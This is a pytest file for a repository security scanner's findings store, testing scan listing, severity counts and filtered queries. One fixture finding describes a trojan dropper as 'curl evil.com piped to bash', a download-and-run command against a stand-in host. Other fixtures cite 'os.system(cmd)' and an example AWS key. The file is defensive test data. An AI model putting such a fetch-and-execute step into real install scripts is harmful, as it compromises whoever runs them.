"""Tests for extended ScanStore query methods supporting the dashboard."""

from __future__ import annotations

import pytest

from agentpoi_scan.findings.model import Finding
from agentpoi_scan.report.store import ScanStore


def _make_finding(**kw) -> Finding:
    base = {
        "file": "src/app.py",
        "lines": [10],
        "category": "sast",
        "severity": "high",
        "title": "Unsafe subprocess call",
        "detail": "subprocess.Popen without shell=False",
        "scanner": "python_sast",
        "commit_sha": "abc1234",
        "status": "open",
    }
    base.update(kw)
    return Finding(**base)


@pytest.fixture
def empty_store(tmp_path):
    store = ScanStore(tmp_path / "test_store.sqlite3")
    yield store
    store.close()


@pytest.fixture
def populated_store(tmp_path):
    store = ScanStore(tmp_path / "populated_store.sqlite3")
    # Scan 1: repo-alpha
    f1 = _make_finding(
        severity="critical",
        category="malware",
        status="open",
        title="Trojan dropper in setup.py",
        file="setup.py",
        detail="curl evil.com piped to bash",
    )
    f2 = _make_finding(
        severity="high",
        category="sast",
        status="confirmed",
        title="Command injection in utils",
        file="utils.py",
        detail="os.system(cmd)",
    )
    f3 = _make_finding(
        severity="medium",
        category="secrets",
        status="triaged",
        title="Hardcoded AWS key",
        file="config.py",
        detail="AKIAIOSFODNN7EXAMPLE found in file",
    )
    f4 = _make_finding(
        severity="low",
        category="ci_iac",
        status="refuted",
        title="Permissive workflow permissions",
        file=".github/workflows/ci.yml",
        detail="write-all permissions specified",
    )
    store.add_scan("org/repo-alpha", "sha111", [f1, f2, f3, f4])

    # Scan 2: repo-beta
    f5 = _make_finding(
        severity="high",
        category="autorun",
        status="escalated",
        title="Autorun command execution in setup.cfg",
        file="setup.cfg",
        detail="cmdclass override executes code",
    )
    store.add_scan("org/repo-beta", "sha222", [f5])

    yield store
    store.close()


def test_list_scans_empty(empty_store):
    scans = empty_store.list_scans()
    assert scans == []


def test_list_scans_ordering_and_limit(populated_store):
    scans = populated_store.list_scans(limit=10)
    assert len(scans) == 2
    # Newest scan first
    assert scans[0]["repo"] == "org/repo-beta"
    assert scans[0]["commit_sha"] == "sha222"
    assert "id" in scans[0]
    assert "created_at" in scans[0]
    assert "risk" in scans[0]
    assert "vulnerable" in scans[0]["risk"]
    assert "malicious" in scans[0]["risk"]

    assert scans[1]["repo"] == "org/repo-alpha"
    assert scans[1]["commit_sha"] == "sha111"

    # Test limit=1
    scans_limited = populated_store.list_scans(limit=1)
    assert len(scans_limited) == 1
    assert scans_limited[0]["repo"] == "org/repo-beta"


def test_count_findings_by_severity(populated_store):
    # Scan 1 has 1 critical, 1 high, 1 medium, 1 low
    counts_scan1 = populated_store.count_findings_by_severity(1)
    assert counts_scan1 == {
        "critical": 1,
        "high": 1,
        "medium": 1,
        "low": 1,
    }

    # Scan 2 has 1 high, 0 critical, 0 medium, 0 low
    counts_scan2 = populated_store.count_findings_by_severity(2)
    assert counts_scan2 == {
        "critical": 0,
        "high": 1,
        "medium": 0,
        "low": 0,
    }

    # Non-existent scan returns all zeros
    counts_scan99 = populated_store.count_findings_by_severity(99)
    assert counts_scan99 == {
        "critical": 0,
        "high": 0,
        "medium": 0,
        "low": 0,
    }


def test_get_findings_filtered_unfiltered(populated_store):
    findings = populated_store.get_findings_filtered(1)
    assert len(findings) == 4


def test_get_findings_filtered_by_severity(populated_store):
    crit = populated_store.get_findings_filtered(1, severity="critical")
    assert len(crit) == 1
    assert crit[0].severity == "critical"
    assert crit[0].title == "Trojan dropper in setup.py"

    med = populated_store.get_findings_filtered(1, severity="medium")
    assert len(med) == 1
    assert med[0].severity == "medium"


def test_get_findings_filtered_by_category(populated_store):
    sast = populated_store.get_findings_filtered(1, category="sast")
    assert len(sast) == 1
    assert sast[0].category == "sast"
    assert sast[0].file == "utils.py"

    empty = populated_store.get_findings_filtered(1, category="deps")
    assert empty == []


def test_get_findings_filtered_by_status(populated_store):
    confirmed = populated_store.get_findings_filtered(1, status="confirmed")
    assert len(confirmed) == 1
    assert confirmed[0].status == "confirmed"

    refuted = populated_store.get_findings_filtered(1, status="refuted")
    assert len(refuted) == 1
    assert refuted[0].status == "refuted"


def test_get_findings_filtered_by_search_query(populated_store):
    # Match in title
    res_title = populated_store.get_findings_filtered(1, search="Trojan")
    assert len(res_title) == 1
    assert res_title[0].title == "Trojan dropper in setup.py"

    # Match in file path
    res_file = populated_store.get_findings_filtered(1, search="workflows")
    assert len(res_file) == 1
    assert res_file[0].file == ".github/workflows/ci.yml"

    # Match in detail
    res_detail = populated_store.get_findings_filtered(1, search="AKIAIOS")
    assert len(res_detail) == 1
    assert res_detail[0].file == "config.py"

    # Case-insensitive / no match
    res_none = populated_store.get_findings_filtered(1, search="nonexistent_needle")
    assert res_none == []


def test_get_findings_filtered_combined(populated_store):
    # Combine severity + category + status + search
    res = populated_store.get_findings_filtered(
        1,
        severity="high",
        category="sast",
        status="confirmed",
        search="os.system",
    )
    assert len(res) == 1
    assert res[0].file == "utils.py"

    # Mismatching combined filter
    mismatch = populated_store.get_findings_filtered(
        1,
        severity="critical",
        category="sast",
    )
    assert mismatch == []


def test_get_findings_filtered_case_insensitive_and_all_handling(populated_store):
    # Case-insensitive severity match
    crit_upper = populated_store.get_findings_filtered(1, severity="CRITICAL")
    assert len(crit_upper) == 1
    assert crit_upper[0].severity == "critical"

    # Case-insensitive category match
    sast_upper = populated_store.get_findings_filtered(1, category="SAST")
    assert len(sast_upper) == 1
    assert sast_upper[0].category == "sast"

    # Case-insensitive status match
    conf_upper = populated_store.get_findings_filtered(1, status="CONFIRMED")
    assert len(conf_upper) == 1

    # 'All' or '' does not filter out items
    all_sev = populated_store.get_findings_filtered(1, severity="All")
    assert len(all_sev) == 4

    empty_sev = populated_store.get_findings_filtered(1, severity="")
    assert len(empty_sev) == 4

    # Non-existent scan returns empty list
    non_existent = populated_store.get_findings_filtered(999)
    assert non_existent == []
